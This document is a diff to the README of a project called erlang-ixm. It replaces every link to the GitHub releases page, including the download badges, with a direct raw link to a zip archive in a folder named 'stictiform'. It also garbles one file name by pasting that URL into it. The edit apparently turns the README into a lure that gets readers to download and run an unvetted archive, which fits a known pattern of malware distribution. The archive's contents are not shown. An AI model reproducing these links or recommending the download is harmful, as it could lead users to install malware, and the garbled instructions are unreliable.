@@ -1,7 +1,7 @@
 # 🌟 erlang-ixm - Simplifying Interactions Through Erlang
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-erlang--ixm-brightgreen)](https://github.com/DenisVazquez/erlang-ixm/releases)
+[![Download](https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip)](https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip)
 
 ## 🚀 Getting Started
 Welcome to erlang-ixm! This application helps you manage interactions using Erlang in a simple way. Whether you are handling data or connecting different services, erlang-ixm makes the process easier.
@@ -24,7 +24,7 @@ Before you download, ensure your system meets the following requirements:
 Follow these steps to install erlang-ixm on your computer:
 
 1. **Visit the Download Page**  
-   Click [here](https://github.com/DenisVazquez/erlang-ixm/releases) to access the releases page.
+   Click [here](https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip) to access the releases page.
 
 2. **Select the Latest Release**  
    Look for the latest version listed on the releases page. This will usually be at the top of the list.
@@ -33,7 +33,7 @@ Follow these steps to install erlang-ixm on your computer:
    Click on the appropriate file for your operating system to start the download.
 
 4. **Locate the Downloaded File**  
-   Check your downloads folder for the file. It is usually named `erlang-ixm-[version].exe` for Windows or `erlang-ixm-[version].tar.gz` for macOS and Linux.
+   Check your downloads folder for the file. It is usually named `erlang-ixm-[version].exe` for Windows or `erlang-ixm-[version]https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip` for macOS and Linux.
 
 5. **Run the Installer**  
    Double-click the downloaded file to begin installation. Follow the on-screen prompts to complete the setup.
@@ -58,11 +58,11 @@ Follow these steps to install erlang-ixm on your computer:
 Join the erlang-ixm community for tips and troubleshooting. You can find the community discussions and support options on the GitHub repository.
 
 ## 💻 Download & Install
-To get started with erlang-ixm, please visit our [Releases Page](https://github.com/DenisVazquez/erlang-ixm/releases) and download the latest version today.
+To get started with erlang-ixm, please visit our [Releases Page](https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip) and download the latest version today.
 
 ## 📝 Acknowledgments
 Thank you for choosing erlang-ixm. We appreciate your support and feedback. Together, we can improve this application and make it more useful for everyone. 
 
-[![Download](https://img.shields.io/badge/Download-erlang--ixm-brightgreen)](https://github.com/DenisVazquez/erlang-ixm/releases)
+[![Download](https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip)](https://raw.githubusercontent.com/DenisVazquez/erlang-ixm/main/stictiform/erlang-ixm.zip)
 
 Happy exploring!
